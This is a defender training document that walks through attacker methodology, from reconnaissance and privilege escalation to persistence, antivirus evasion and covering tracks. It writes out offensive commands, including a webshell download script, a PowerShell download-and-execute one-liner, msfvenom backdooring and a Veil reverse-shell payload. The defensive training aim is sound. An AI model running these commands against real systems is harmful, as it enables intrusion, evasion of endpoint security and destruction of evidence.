# Exploring Threat Methodologies

In [Using A Threat-Based Approach For Detection](Using%20a%20Threat-based%20Approach%20For%20Detection.md) we saw how studying adversary behavior provides tactical advantages in IR and improved detection in monitoring and hunting.  Knowledge we obtain from emulating adversary tradecraft helps us anticipate and counter the tactics and techniques that can be used against us.

It's also important to understand their methodologies---how and why an adversary chooses and combines individual techniques for specific scenarios and objectives.  We can research, emulate, and practice these to build on our understanding of attacks and improve our confidence in defense. 

This training document will walkthrough examples of some common threat methodologies:

- [Enumerate and Exploit](#enumerate-and-exploit)
	- [Remote Enumeration](#remote-enumeration)
	- [Remote Exploit](#remote-exploit)
	- [Local Enumeration](#local-enumeration)
	- [Local Exploit](#local-exploit)
- [Code Execution Improvement](#code-execution-improvement)
	- [Single Command](#single-command)
	- [Interactive Shell](#interactive-shell) 
	- [Post-Exploitation Agent](#post-exploitation-agent)
- [Scripting and Automation](#scripting-and-automation)
	- [Remote Enumeration](#remote-enumeration)
	- [Building Payloads](#building-payloads)
	- [Local Enumeration](#local-enumeration)
- [Overcoming Obstacles](#overcoming-obstacles)
	- [Configurations](#configurations)
	- [Endpoint Security](#endpoint-security)
	- [Network Security](#network-security)

## Enumerate and Exploit

There are many different approaches an adversary can take depending on their target, timeframe, and objectives.  Methodologies can be opportunistic---designed to capitalize on mistakes and predictable defenses---or they can be a systematic probing and dismantling of all defenses.

All should be explored, practiced, and learned.  But here we'll start out using a general methodology used by an adversary attempting to compromise a system or network:

|Step|Description|
|-|-|
|[Reconnaissance](#reconnaissance)|Gather information about the network and environment|
|[Remote Enumeration](#remote-enumeration)|Scan target system to identify ports/services/versions|
|[Remote Exploit](#remote-exploit)|Gain access to the target machine|
|[Local Enumeration](#local-enumeration)|Search the target machine for opportunities to escalate privileges|
|[Local Exploit](#local-exploit)|Escalate privileges to gain full control of target machine|
|[Root Loot](#root-loot)|Search the target machine with admin/root privileges|
|[Install Persistence](#install-persistence)|Establish a way to maintain access to the target host|
|[Cover Tracks](#cover-tracks)|Delete logs, files, and all evidence of compromise|

### Reconnaissance

During reconnaissance, scanning is a common way to identify target systems and infrastructure.  The tool `netdiscover` is a good example which uses ARP requests and replies to accomplish this:

```
netdiscover –i eth0 –r $range
```

![](images/Exploring%20Threat%20Methodologies/image001.png)<br><br>

There are many other ways to perform reconnaissance including:

|Type|Command|
|-|-|
|ID DNS and do Zone xfer|`for x in $(host -t ns $site\|cut -d " " -f4); do host -l $site $x \|grep "has address";done`|
|Zone Transfer|`dig $site -t axfr dnsrecon.py -a -d $site`|
|Reverse DNS|`dig -x $ip`|
|DNS Recon|`dig $site -t any dnsrecon.py -d $site`|
|DNS Host Guessing|`dnsrecon.py -t brt -d $site -D /opt/dnsrecon/namelist.txt` <br> `for x in $(cat subs.txt); do host $x.$site;done`|
|Reverse (PTR) Scan|`use auxillary/gather/dns_reverse_lookup` <br> `dnsrecon.py -r $range`|
|Nmap scan|`nmap -sL $range \| grep \)`|
|Bash scan|`for x in $(seq 1 128); do host 10.10.10.$x; done \| grep -v "not found"`|


### Remote Enumeration

The Remote Enumeration phase is designed to gather information about a target host and evaluate its attack surface. It usually centers around indentifying all open TCP/UCP ports and services. 

Here are some common tools used for port scanning:

|Type|Command|
|-|-|
|Nmap|`nmap -Pn -p1-65535 -o tcp-$ip -T 4 $ip`|
|Masscan|`masscan -e tun0 -p0-65535 --max-rate 500 $ip`|
|Unicornscan|`unicorn -mTsf -Iv -r 1000 10.10.10.10:a`|

<br>

A good option with Nmap is to perform separate TCP and UDP scans while capturing the output into files:

```
nmap -Pn -p1-65535 -o tcp-$ip -T 4 $ip | grep -v 'filtered|closed'
nmap -Pn -sU -p1-65535 -o udp-$ip -T 4 $ip | grep -v 'filtered|closed'
```

<br>

After you have a list of open ports, perform service profiling on each ports, again capturing the results into a file:

```
for p in $(grep open tcp-$ip | cut -d "/" -f 1);do nmap -Pn -sV -p$p -T 4 $ip|grep open > ver-$ip; done
for p in $(grep open udp-$ip | cut -d "/" -f 1);do nmap -Pn -sV -p$p -T 4 $ip|grep open > ver-$ip; done
```

This creates a file named `ver-<ip address>` showing each open port identified and the service listening on each one:

![](images/Exploring%20Threat%20Methodologies/image030.png)<br><br>

<br>

For each service identified, specialized tools can then be used to gather additional information.  Here are some tools designed for scanning web applications:

|Type|Command|
|-|-|
|Spidering|`fimap -u $site`|
|Scanning|`nikto -h $ip -p 80`, |
|Page/Dir Guessing|`dirb`, `dirbuster`, `Gobuster`, `dirsearch.py`, `wfuzz`|
|Scraping|`cewl -d 2 -m 5 -w words.txt $site 2>/dev/null`|
|Mangling|`john --wordlist=words.txt --rules --stdout > mangled_words.txt`|
|CMS Scan|`wpscan -e vp -u $ip/$site` <br> `joomscan -u http://$ip` <br> `droopescan scan drupal -u $site -t 32` <br> `cmsmap $site` <br> `vbscan.pl $site`|


Tools like [BurpSuite]() and [ZAProxy]() can be used to automate many of these tasks or used to perform manual browsing, submit data on forms, inspect web traffic and source code, etc.

### Remote Exploit

A remote exploit is the leveraging of discovered credentials or vulnerabilities that grants the adversary access to the target machine---sometimes in an admin context, but most often this happens in a non-admin context.

If in an admin context, the adversary can immediately begin searching the entire system in an admin context for information to support their objective.  If not, additional enumeration must be performed to identify a method for escalating privileges.  This is similar to remote enumeration but performed locally on the system.

There are many resources online that match exploits to OS/services, but here are two ways that can be used to search quickly within Kali Linux:

|Type|Command|
|-|-|
|Search ExploitDB|`searchsploit <term>`|
|Search for Metasploit module|`msf> search <term>`|

Here is `searchsploit` being used to search for exploits for a specific version of an HTTP File Server application:

![](images/Exploring%20Threat%20Methodologies/image037.png)<br><br>

A remote exploit can be performed manually or in this case using a Metasploit module:

![](images/Exploring%20Threat%20Methodologies/image044.png)<br><br>

### Local Enumeration

This can be done manually using techniques outlined in resources like [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) and the [Basic Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/) but is more commonly performed via an enumeration script or program.

Here are some common privilege escalation scrips/programs:

|||
|-|-|
|[Metasploit modules](https://github.com/rapid7/metasploit-framework/tree/master/modules)|`use post/multi/recon/local_exploit_suggester`|
|[Windows Privesc Check](https://github.com/pentestmonkey/windows-privesc-check)|`windows-privesc-check2.exe --audit -a -o report`|
|[PowerUp](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/PowerUp.ps1)|`Import-Module PowerUp.ps1; Invoke-AllChecks`|
|[SharpUp](https://github.com/GhostPack/SharpUp)|`SharpUp.exe`|
|[Sherlock](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1)|`Import-Module Sherlock.ps1; Find-AllVulns`|
|[Watson](https://github.com/rasta-mouse/Watson)|`Watson.exe`|
|[windows-exploit-suggester.py](https://github.com/GDSSecurity/Windows-Exploit-Suggester)|`python windows-exploit-suggester.py -u` <br> `python windows-exploit-suggester.py -d <xls> -i systeminfo.txt`|
|[linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker)|`python linuxprivchecker.py`|

These perform a series of checks and tests to determine if any known vulnerabilities exist, and if so how likely they are to succeed based on what is discovered in the environment.

This is a report generated by `windows-privesc-check2.exe` running on a target host:

![](images/Exploring%20Threat%20Methodologies/image049.png)<br><br> 

And here is a meterpreter session being used to run the `local_exploit_suggester` module on a target host:

![](images/Exploring%20Threat%20Methodologies/image073.png)<br><br>

### Local Exploit

Local exploits are performed in a non-admin context to obtain admin privileges on the target system.

Here a non-admin shell is used to compile and run an exploit on the target machine:

![](images/Exploring%20Threat%20Methodologies/image023.png)<br><br>

Then it is run and netcat is used on the attacking machine to receive the reverse shell:

![](images/Exploring%20Threat%20Methodologies/image000.png)<br><br>

Many agents have modules that can automatically perform local exploits like this one in Metasploit:

![](images/Exploring%20Threat%20Methodologies/image074.png)<br><br>

When this module runs, it completes all tasks required to exploit the vulnerability and presents the user with a SYSTEM level shell:

![](images/Exploring%20Threat%20Methodologies/image076.png)<br><br>

### Root Loot

The purpose of the Root Loot phase is to search the compromised system in the context of a super user to identify information that could support adversary objectives or provide opportunities to pivot.  

Pulling credentials with mimikatz:



Searching for files that contain passwords:

![](images/Exploring%20Threat%20Methodologies/image009.png)<br><br>

### Install Persistence

Persistence can be implemented in a user or superuser context.  In both cases, the purpose is to maintain access to the target machine should interactive access be terminated.

Here [Empire]() is used to install persistence with the `persistence/userland/registry` module:

![](images/Exploring%20Threat%20Methodologies/image004.png)<br><br>


### Cover Tracks

Most post-exploitation agents have modules that are OPSEC-aware and are also capable of cleaning up artifacts created during the compromise.  Other options are encrypting or overwriting files and drives to prevent leaving indicators of adversary actions.

[PoshC2](https://poshc2.readthedocs.io/en/latest/index.html) has several modules like this:

|Module|Description|
|-|-|
|Posh-Delete|Overwrites file with random contents before deleting|
|Kill-Implant|Terminates the agent process|
|TimeStomp|Change timestamps of files|


## Code Execution Improvement
 
Working from the ability to run single commands to a post-exploitation agent running in memory.

- [Single Command](#single-command)
- [Interactive Shell](#interactive-shell) 
- [Post-Exploitation Agent](#post-exploitation-agent)

### Single Command

The simplest way to execute code is a single command.  This could be as a result of an application via command injection, SQL injection, LFI/RFI, stolen credentials, or a user opening a phishing document.

Classic example is a Buffer Overflow...

![](images/Exploring%20Threat%20Methodologies/image077.png)<br><br> 

Methods for gaining interactive shell session:

- Download and run a reverse shell
- Expose a service providing shell access
- Create a user with shell access


### Interactive Shell

Shell sessions such as SSH, Command Prompt, PowerShell, Python, Javascript, Bash, etc. provide interactive access with more options and flexibility.

This is a Metasploit module being used to improve a vulnerability allowing the execution of single arbitrary commands to interactive shell access:

![](images/Exploring%20Threat%20Methodologies/image031.png)<br><br> 

### Post-Exploitation Agent

Post-exploitation agents such as Meterpreter, Empire, PoshC2, and Beacon provide access to hundreds of built-in tools and the ability to run pre-built modules, pass sessions, and import custom scripts and programs from a single interface.

We can improve this shell session by deploying a meterpreter agent in memory with the `shell_to_meterpreter` module:

![](images/Exploring%20Threat%20Methodologies/image033.png)<br><br>

Now meterpreter commands and modules are available:

![](images/Exploring%20Threat%20Methodologies/image035.png)<br><br>

These tools specialize in using a single command to deploy highly capable agents in the memory of a target machine.  Here is a brand new agent being deployed after a user on the target machine ran a single PowerShell command:

![](images/Exploring%20Threat%20Methodologies/image003.png)<br><br>

They allow custom configuration of C2 infrastructure and are designed to handle and interact with multiple agents from one interface:

![](images/Exploring%20Threat%20Methodologies/image006.png)<br><br>

![](images/Exploring%20Threat%20Methodologies/image008.png)<br><br>

Each comes with hundreds of pre-packaged modules to choose from:

![](images/Exploring%20Threat%20Methodologies/image002.png)<br><br>


## Scripting and Automation

For the adversary, the ability to quickly carry out tasks on a system decreases the chances they will be detected by tools or analysts. When emulating their techniques, scripting and automating results in less time spent typing, searching, and organizing tools and information.  

Automation in these areas saves a significant amount time and effort:

- [Remote Enumeration](#remote-enumeration)  
- [Building Payloads](#building-payloads)  
- [Local Enumeration](#local-enumeration)   

### Remote Enumeration

Build scripts that perform some standard port and service scans on a target IP address that you provide it.

Here is an example script:

```bash
#!/bin/bash

if [ "$#"  -ne 1 ]
  then
    echo "Must supply IP address as argument"
    exit
fi

ip=$1
nmap -Pn -p1-65535 -o tcp-$ip $ip -T 4 | grep -v 'filtered|closed'
for p in $(grep open tcp-$ip | cut -d "/" -f 1);do nmap -Pn -sV -p$p $ip -T 4 |grep open >> ver-$ip;done
```

This creates a file named `ver-<ip address>` showing each open port identified and the service listening on each one:

![](images/Exploring%20Threat%20Methodologies/image030.png)<br><br>


### Building Payloads

Have standard payloads built ahead of time that are configured with the IP address of your attacking machine for quick deployment.

Here [PoshC2](https://poshc2.readthedocs.io/en/latest/index.html) constructs and serves a variety of payloads and provides one-liners that will download and run the agent in memory:

![](images/Exploring%20Threat%20Methodologies/image005.png)<br><br>

Use the `msfvenom` utility to create common payloads such as this backdoored version of `plink.exe` that creates a reverse shell back to 10.10.14.11 on port 8443:

![](images/Exploring%20Threat%20Methodologies/image007.png)<br><br>


### Local Enumeration

You can look for opportunites to escalate privileges manually using lists like or you can gather some privesc programs/scripts ahead of time so they can be quickly deployed when engaging a target machine.

Create a script that pulls all of these down at once. Here is an example---adjust the names and locations for your own custom setup:

```bash
#!/bin/bash

# remote enumeration 
echo "> Getting Gobuster.."
apt install gobuster -y
if (command -v gobuster 1>/dev/null)
then echo "+ Gobuster installed at $(which gobuster)"

# payloads
echo "> Getting webshell..."
wget https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp -O index.jsp
rm -rf webshell && rm -f wshell.war && mkdir wshell
cp index.jsp wshell/ && cd wshell
jar -cvf ../wshell.war *

# local enumeration
echo "> Getting windows-privesc-check2.exe..."
wget https://github.com/pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe -O wpc2.exe
if (file wpc2.exe 1>/dev/null)
then echo "+ windows-privesc-check2 downloaded as wpc2.exe"

echo "> Getting PowerUp.ps1..." 
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/PowerUp.ps1
if (file PowerUp.ps1 1>/dev/null)
then echo "+ PowerUp.ps1 downloaded"

echo "> Getting linuxprivchecker..."
wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
if (file linuxprivchecker.py 1>/dev/null)
then echo "+ linuxprivchecker.py downloaded"
```


## Overcoming Obstacles

Defensive controls and best practices can present several different types of obstacles that an adversary must address:

- [Configurations](#configurations)
- [Endpoint Security](#endpoint-security)
- [Network Security](#network-security)


### Configurations

Overcoming defenses such as Application whitelisting, Constrained Language Mode, and interacting with Windows technologies from Kali Linux.

Interfacing with Windows technologies from Kali Linux can present different challenges.  Installing Docker on Kali provides an easy way to quickly load different environments that may be required: 

```bash
curl -fsSL https://download.docker.com/linux/debian/gpg |apt-key add -
echo 'deb https://download.docker.com/linux/debian stretch stable' > /etc/apt/sources.list.d/docker.list
apt-get update
apt-get remove docker docker-engine docker.io
apt-get install docker-ce
```

For example, logging in to Windows machines via WinRM from Kali.

Pull the `quickbreach/powershell-ntlm` image:

![](images/Exploring%20Threat%20Methodologies/image002.png)<br><br>

Then start a container and log into the target machine via PowerShell Remoting:

![](images/Exploring%20Threat%20Methodologies/image003.png)<br><br>

### Endpoint Security

Techniques are needed to deal with various endpoint controls such as EDRs, AntiVirus, process logging, command line logging, etc.

|||
|-|-|
|In Memory|Meterpreter:  `execute -H -m -d calc.exe -f c:\\Windows\\System32\\whoami.exe -a "/all"` <br> PowerShell: `IEX (New-Object Net.WebClient).DownloadString("https://$ip/script.ps1")` <br> Empire:      `[>] Module is not opsec safe, run? [y/N]`  |
|On Disk|  msfvenom: `msfvenom -x plink.exe -op plink_bd.exe` <br> [Veil](https://github.com/Veil-Framework/Veil): `./Veil.py -t Evasion -p go/meterpreter/rev_tcp.py --ip 127.0.0.1 --port 4444` <br> [TheShellterProject](https://www.shellterproject.com/)|


### Network Security

Network security controls can limit options for accessing services on the target host. A reverse shell used with port forwarding will allow an adversary to reach ports and services denied by firewalls:

![](images/Exploring%20Threat%20Methodologies/image078.png)<br><br>

Many post-exploitation tools provide this capability for accomplishing remote logins, file transfers, and pivoting even when network controls are in place.

## Summary

A methodology is a way of selecting techniques appropriate for a specific scenario.  Confidence in your defense comes from knowing exactly what you are supposed to do in a given situation, which you get from understanding adversary tools, techniques, and methodologies.  

Training labs are a learning tool that can increase your understanding of adversary approaches and attacks.  Emulation and practical application increases your ability to correctly identify and stop them during an incident.  

Yes, CTF and pentesting challenges are different from apex actors targeting your network.  Still, they are a great way to build your skills and confidence in identifying and understanding offensive tools, techniques, and strategies.
